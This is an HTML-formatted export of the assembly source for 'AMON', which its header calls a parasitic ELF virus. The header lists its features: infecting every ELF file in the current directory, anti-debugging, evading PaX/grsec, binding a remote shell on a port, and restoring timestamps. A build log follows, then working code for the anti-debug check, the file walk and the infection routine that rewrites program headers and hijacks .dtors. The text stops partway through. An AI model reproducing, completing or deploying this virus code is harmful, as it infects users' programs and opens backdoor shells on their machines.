<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc0">
</span><span class="sc1">;------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;                       AMON by emp &amp;&amp; rikenar</span><span class="sc0">
</span><span class="sc1">;                       ----------------------</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; AMON : parasitic ELF virus</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;                      Description :</span><span class="sc0">
</span><span class="sc1">;                      -------------</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; - Infect all ELF in the current directory.</span><span class="sc0">
</span><span class="sc1">; - Full compatible with all kernel 2.2.x,2.4.x and probably with all 2.6.x.</span><span class="sc0">
</span><span class="sc1">; - Full compatible with all options of kernel security patch (PaX/grsec ...).</span><span class="sc0">
</span><span class="sc1">; - Use basic EPO technic.</span><span class="sc0">
</span><span class="sc1">; - Use basic anti debug trick.</span><span class="sc0">
</span><span class="sc1">; - Bind a shell on port 5556 if UID = 0 else bind a shell on port 5555.</span><span class="sc0">
</span><span class="sc1">; - Only 960 bytes with complete strip.</span><span class="sc0">
</span><span class="sc1">; - Restore date and time of last modification.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Tested on - redhat 9.0 (kernel 2.4.20 &amp;&amp; 2.4.21+grsec/PaX)</span><span class="sc0">
</span><span class="sc1">;           - debian 3.0 (kernel 2.2.20 &amp;&amp; 2.2.25+PaX)</span><span class="sc0">
</span><span class="sc1">;           - KNOPPIX 3.2 (kernel 2.4.21)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;anonymous@neptune ~/code/amon $ cat Makefile</span><span class="sc0">
</span><span class="sc1">;all:</span><span class="sc0">
</span><span class="sc1">;        @echo "-+ amon by rikenar and emp +-"</span><span class="sc0">
</span><span class="sc1">;        nasm -f elf amon.asm</span><span class="sc0">
</span><span class="sc1">;        cc amon.o -o amon -nostdlib</span><span class="sc0">
</span><span class="sc1">;        rm -f amon.o</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;strip:</span><span class="sc0">
</span><span class="sc1">;        strip amon</span><span class="sc0">
</span><span class="sc1">;        sstrip amon</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;anonymous@neptune ~/code/amon $ make</span><span class="sc0">
</span><span class="sc1">;-+ amon by rikenar and emp +-</span><span class="sc0">
</span><span class="sc1">;nasm -f elf amon.asm</span><span class="sc0">
</span><span class="sc1">;cc amon.o -o amon -nostdlib</span><span class="sc0">
</span><span class="sc1">;rm -f amon.o</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;anonymous@neptune ~/code/amon $ make strip</span><span class="sc0">
</span><span class="sc1">;strip amon</span><span class="sc0">
</span><span class="sc1">;sstrip amon</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;anonymous@neptune ~/code/amon $ ls -l amon</span><span class="sc0">
</span><span class="sc1">;-rwx------    1 anonymous  anonymous       960 nov  7 01:48 amon</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;greetz : people on #ioc and all our friends</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;------------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc9">%define</span><span class="sc0">         </span><span class="sc5">sys_fork</span><span class="sc0">        </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc9">%define</span><span class="sc0">         </span><span class="sc5">sys_read</span><span class="sc0">        </span><span class="sc2">3</span><span class="sc0">
</span><span class="sc9">%define</span><span class="sc0">         </span><span class="sc5">sys_open</span><span class="sc0">        </span><span class="sc2">5</span><span class="sc0">
</span><span class="sc9">%define</span><span class="sc0">         </span><span class="sc5">sys_close</span><span class="sc0">       </span><span class="sc2">6</span><span class="sc0">
</span><span class="sc9">%define</span><span class="sc0">         </span><span class="sc5">sys_exec</span><span class="sc0">        </span><span class="sc2">11</span><span class="sc0">
</span><span class="sc9">%define</span><span class="sc0">         </span><span class="sc5">sys_getpid</span><span class="sc0">      </span><span class="sc2">20</span><span class="sc0">
</span><span class="sc9">%define</span><span class="sc0">         </span><span class="sc5">sys_getuid</span><span class="sc0">      </span><span class="sc2">24</span><span class="sc0">
</span><span class="sc9">%define</span><span class="sc0">         </span><span class="sc5">sys_ptrace</span><span class="sc0">      </span><span class="sc2">26</span><span class="sc0">
</span><span class="sc9">%define</span><span class="sc0">         </span><span class="sc5">sys_kill</span><span class="sc0">        </span><span class="sc2">37</span><span class="sc0">
</span><span class="sc9">%define</span><span class="sc0">         </span><span class="sc5">sys_dup2</span><span class="sc0">        </span><span class="sc2">63</span><span class="sc0">
</span><span class="sc9">%define</span><span class="sc0">         </span><span class="sc5">sys_mmap</span><span class="sc0">        </span><span class="sc2">90</span><span class="sc0">
</span><span class="sc9">%define</span><span class="sc0">         </span><span class="sc5">sys_munmap</span><span class="sc0">      </span><span class="sc2">91</span><span class="sc0">
</span><span class="sc9">%define</span><span class="sc0">         </span><span class="sc5">sys_ftruncate</span><span class="sc0">   </span><span class="sc2">93</span><span class="sc0">
</span><span class="sc9">%define</span><span class="sc0">         </span><span class="sc5">sys_socket</span><span class="sc0">      </span><span class="sc2">102</span><span class="sc0">
</span><span class="sc9">%define</span><span class="sc0">         </span><span class="sc5">sys_fstat</span><span class="sc0">       </span><span class="sc2">108</span><span class="sc0">
</span><span class="sc9">%define</span><span class="sc0">         </span><span class="sc5">sys_getdents</span><span class="sc0">    </span><span class="sc2">141</span><span class="sc0">

</span><span class="sc9">%define</span><span class="sc0">         </span><span class="sc5">PT_LOAD</span><span class="sc0">         </span><span class="sc2">01</span><span class="sc0">
</span><span class="sc9">%define</span><span class="sc0">         </span><span class="sc5">O_RDWR</span><span class="sc0">          </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc9">%define</span><span class="sc0">         </span><span class="sc5">LISTEN</span><span class="sc0">          </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc9">%define</span><span class="sc0">         </span><span class="sc5">SIGKILL</span><span class="sc0">         </span><span class="sc2">9</span><span class="sc0">
</span><span class="sc9">%define</span><span class="sc0">         </span><span class="sc5">ELFMAG</span><span class="sc0">          </span><span class="sc2">0x464C457F</span><span class="sc0">

</span><span class="sc9">global</span><span class="sc0"> </span><span class="sc5">_start</span><span class="sc0">

</span><span class="sc9">section</span><span class="sc0"> </span><span class="sc5">.evil</span><span class="sc0">

</span><span class="sc5">_start</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;ptrace(PTRACE_TRACEME, 0, 0x1, 0)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;anti debug trick</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">cdq</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                </span><span class="sc1">;PTRACE_TRACEME</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">sys_ptrace</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">0x80</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc10">NEAR</span><span class="sc0"> </span><span class="sc5">byebye</span><span class="sc0">             </span><span class="sc1">;if code is traced then exit</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">bomb</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; find file to infect and call the infection function</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'.'</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">opendir</span><span class="sc0">                   </span><span class="sc1">;open current directory</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">getdents</span><span class="sc0">                  </span><span class="sc1">;list file of this directory</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">  </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x08</span><span class="sc0">                  </span><span class="sc1">;next name</span><span class="sc0">

</span><span class="sc5">again</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">  </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">openfile</span><span class="sc0">                   </span><span class="sc1">; open file</span><span class="sc0">


        </span><span class="sc6">cmp</span><span class="sc0">   </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xFF</span><span class="sc0">                  </span><span class="sc1">; if error on open</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">    </span><span class="sc5">nextf</span><span class="sc0">                     </span><span class="sc1">; find another file</span><span class="sc0">


        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">verif</span><span class="sc0">                      </span><span class="sc1">; test file type and infection</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">   </span><span class="sc5">nextf</span><span class="sc0">                      </span><span class="sc1">; find another file</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">sys_fstat</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">  </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x40</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">  </span><span class="sc2">0x80</span><span class="sc0">                       </span><span class="sc1">; file size</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">  </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x40</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">0x28</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">0x20</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                        </span><span class="sc1">; save name of file for utime.</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">0x14</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; ecx = st_size</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">infection</span><span class="sc0">                  </span><span class="sc1">; WAR IS ON !</span><span class="sc0">

        </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                   </span><span class="sc1">; fd in esi.</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x1e</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">0x80</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">

</span><span class="sc5">nextf</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                   </span><span class="sc1">; fd in ebx.</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">sys_close</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">0x80</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">nextfile</span><span class="sc0">                   </span><span class="sc1">; find next file</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">  </span><span class="sc5">again</span><span class="sc0">

</span><span class="sc5">exit</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">byebye</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">; bye bye</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">0x80</span><span class="sc0">

</span><span class="sc1">;---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; infection functions</span><span class="sc0">

</span><span class="sc5">infection</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">  </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x2000</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">  </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xFFFFF000</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">sys_ftruncate</span><span class="sc0">         </span><span class="sc1">; size of file multiple of 0x1000</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">  </span><span class="sc2">0x80</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                        </span><span class="sc1">; save fd</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                        </span><span class="sc1">; push size of file for unmap</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Mapping</span><span class="sc0">                    </span><span class="sc1">; map file, adress of map in eax.</span><span class="sc0">



        </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">0x1c</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">  </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">0x2a</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; phdr INTERP.</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">0x04</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; offset of this phdr.</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">  </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                   </span><span class="sc1">; size of code to move.</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">  </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">  </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">  </span><span class="sc6">movsb</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">0x1c</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">  </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">0x2a</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">  </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">  </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x1000</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">  </span><span class="sc6">movsb</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">  </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">PatchSegment</span><span class="sc0">               </span><span class="sc1">; Patch segments.</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">PatchSection</span><span class="sc0">               </span><span class="sc1">; Patch sections.</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x1000</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">0x20</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">            </span><span class="sc1">; Patch e_shoff.</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">delta</span><span class="sc0">
</span><span class="sc5">delta</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">delta</span><span class="sc0">                  </span><span class="sc1">; delta offset.</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_start</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">  </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                   </span><span class="sc1">; ebp = adress of code</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">  </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">fin_code</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">_start</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">  </span><span class="sc6">movsb</span><span class="sc0">                      </span><span class="sc1">; write code.</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">hijackDtors</span><span class="sc0">                </span><span class="sc1">; hijack .dtors.</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">ecx</span><span class="sc0">                        </span><span class="sc1">; restaure the size</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Demap</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">ebx</span><span class="sc0">                        </span><span class="sc1">; restaure fd</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;in  : name directory in ebx</span><span class="sc0">
</span><span class="sc1">;out : fd in eax</span><span class="sc0">

</span><span class="sc5">opendir</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">sys_open</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">  </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">           </span><span class="sc1">;O_RDONLY</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">  </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">  </span><span class="sc2">0x80</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;in  : pointer to name of file in ebx</span><span class="sc0">
</span><span class="sc1">;out : fd in ebx</span><span class="sc0">

</span><span class="sc5">openfile</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">sys_open</span><span class="sc0">      </span><span class="sc1">;open</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">  </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">O_RDWR</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">  </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">  </span><span class="sc2">0x80</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;in  : directory fd in eax</span><span class="sc0">
</span><span class="sc1">;out : result of getdents on stack</span><span class="sc0">

</span><span class="sc5">getdents</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">esi</span><span class="sc0">                </span><span class="sc1">;save ret addr</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">  </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x10000</span><span class="sc0">       </span><span class="sc1">;i want some place on stack</span><span class="sc0">

        </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
